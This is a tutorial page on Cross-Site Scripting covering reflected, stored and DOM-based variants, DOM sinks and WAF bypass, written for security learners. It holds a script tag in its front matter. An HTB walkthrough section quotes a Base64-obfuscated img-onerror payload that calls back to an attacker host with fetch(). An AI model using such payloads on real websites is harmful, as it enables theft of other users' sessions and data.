---
description: <script>alert('xss')</script>
---

# Cross-Site Scripting

Cross-Site Scripting, or XSS, is a vulnerability that allows attackers to exploit the interactions that **other users** have with an application. It may allow one to impersonate and perform actions as another user, steal information and in some cases, gain RCE.


## XSS

The most common way of testing for XSS is to call the Javascript alert function. For example, the script tags of HTML can be used :`<script>alert(1)</script>`, which produces this window:

<figure><img src="../../.gitbook/assets/image (2545).png" alt=""><figcaption></figcaption></figure>

Browsers and websites allow users to interact with them and perform actions through Javascript. XSS would work via injecting malicious Javascript code to execute on a user's browser.

There are 3 types of XSS:

1. Reflected XSS
2. Stored XSS
3. DOM Based XSS

### Reflected XSS

Reflected XSS is the simplest form of the exploit. This occurs when a malicious script is reflected off a web application and onto the victim's browser. This script is normally activated through a link or action on the website and would be redirected to the next user.

<figure><img src="../../.gitbook/assets/image (3766).png" alt=""><figcaption></figcaption></figure>

An example would be as follows:

* Suppose a website has a function that uses a user-controlled parameter like `http://example.com?search=test`
* This search term causes this to appear on the page:
  * `<p>You searched for: test </p>`
* Using Reflected XSS, one construct a malicious search link that would trigger a pop-up to appear on screen.&#x20;
* Use `http://example.com?search=<script>alert(1)</script>` as the URL. 
* When any other user enters this link, malicious scripts could be executed on their end and the pop-up would show up in their browsers.
* This works because the rendering of HTML would show this:
  * `<p>You searched for: <script>alert(1)</script></p>`
  * The script tags allow for an 'escape' from the paragraph tags, and we can execute Javascript code within the tags.

Reflected XSS attacks still rely on the **victim user to make the request themselves**. The best attackers to trigger this is to send phishing links or putting malicious links all over a website.

The reliance on the user makes the impacts of XSS less severe compared to the other forms of XSS.

### Stored XSS

Stored XSS means that the malicious script is stored on the website itself. Each time a user visits the page that the script is on, it would execute. Stored XSS has much more severe impacts, as it only requires users visit the page with the payload. This can be in the form of a blog post comment, editing the website page to have hidden Javascript, etc.

<figure><img src="../../.gitbook/assets/image (1684).png" alt=""><figcaption></figcaption></figure>

Here's an example of XSS from the HTB machine, Extension:

After enumeration of the website, I found a stored XSS vulnerability in the 'Report Issues' function of the Gitea instance. The victim has been found to visit the Issues tab of the Gitea instance from time to time.

This was the payload found to work: `test<test><img SRC="x" onerror=eval.call${"eval\x28atobZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC41LyIp\x29"}>`

How this payload works is through rendering an **image** tag and having a script execute on an **event** called 'onerror', which means if the image fails to load, it would load the script. The script is calling an **eval** function which has a Base64 encoded command using **fetch** to connect back to the attacker machine on port 80.

When inputted, the victim would view the Issues and be served this payload. This results in the victim's browser making a callback to the attacker machine. On the attacker machine, this is received on a `nc` listener.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption></figcaption></figure>

This confirms that the XSS is working properly. For this machine, the payload can be modified to include information about a hidden directory that only the victim can access:

<figure><img src="../../.gitbook/assets/image (1714).png" alt=""><figcaption></figcaption></figure>

Stored XSS is much more dangerous because it stores the script on the page itself and exploiting every user that visits it. In the above example, XSS was used to steal information about a directory that only the user could visit. In other cases, stuff like authorisation cookies or passwords can be stolen by attackers.

### DOM-Based XSS

DOM XSS arises when Javascript takes some input from a user-controlled source and processes it insecurely.&#x20;

> Document Object Model (DOM) is a programming interface for web pages, defining the structure of a document and how the document is accessed and manipulated. A website can use Javascript to do something, but uses DOM to access the document and the relevant elements. DOM is structured like a hiearchy tree, with a root element and other elements that are children of the root node.
>
> More can be read here:
>
> [https://developer.mozilla.org/en-US/docs/Web/API/Document\_Object\_Model/Introduction](https://developer.mozilla.org/en-US/docs/Web/API/Document\_Object\_Model/Introduction)

DOM XSS arises when data is passed to something called a **sink**, defined as a function that supports **dynamic code execution.** Malicious Javascript code can be passed to this sink and allow for the execution of Javascript used to hijack other accounts.

Here are some sinks that can be used for DOM XSS:

```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

These functions **are not limited to only XSS,** but can also be used for other DOM exploits, such as **open redirection,** through exploiting taint flow vulnerabilities.&#x20;

There are methods to test the HTML and Javascript sinks that are within a website that require the use of browser inspector tools, which would involve looking at how data is parsed by the function. First, we would need to identify a potential source (input location) whereby our input is processed via the sink. Then we can test them as follows:

* HTML Sinks
  * Input HTML strings within a potentially vulnerable sink.
  * Check the page source and try to find out string.
  * Attempt to break out of the HTML tags to execute our code.&#x20;
* Javascript execution sinks
  * Use the Javascript Debugger to determine whether and how our input is sent to a sink.
  * Add a break point and follow how the source's value is read, then track the variables to see if they are passed to a sink.
  * Once a vulnerable sink is found, inject malicious payloads.

**Here's an example of exploiting DOM-based XSS:**

Suppose a website uses a dashboard that changes based on the username of the user. The username is encoded **in the URL**, and is **dynamically retrieved** using sinks.

```markup
<html>
<head>
<title>Custom Dashboard </title>
...
</head>
Main Dashboard for
<script>
	var pos=document.URL.indexOf("context=")+8;
	document.write(document.URL.substring(pos,document.URL.length));
</script>
...
</html>
```

The vulnerable sink used is **document.write( )** and the **source** would be a `context` parameter we pass to the website. A malicious script can be embedded in the URL like this: `http://example.com/dashboard.html#context=<script>alert(1)</script>`.

When the link is clicked by a user and their browser starts building the DOM of the page, the malicious context parameter is extracted and the HTML is updated to have our code. The browser then runs this code and calls the alert function.

## Payloads

XSS is a common vulnerability and there are often measures to prevent it's execution. For example, a website could restrict the usage of `events` or `<script>` tags to prevent users from exploiting it. However, there are always ways to bypass this.

In basic cases, websites can allow for `<script>` tags to be used as input and allow for the embedding of HTML directly on the page. However, if the website has a WAF that does not allow this, one can fuzz the tags possible.

Event attributes can be used in conjunction with tags to deliver the payload, such as **onerror**. Again, this can be brute forced. There are many combinations of event events and attributes, and some can bypass the WAFs faced.

> HTML Event attributes allow events to trigger actions on a browser, like starting Javascript whne a user clicks on an element. For example, using the `<img src="x" onerror=alert(1)>` payload would attempt to render an image, which would always result in an error since `x` is not a valid `img src`. This would trigger the alert(1) to happen.

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection" %}
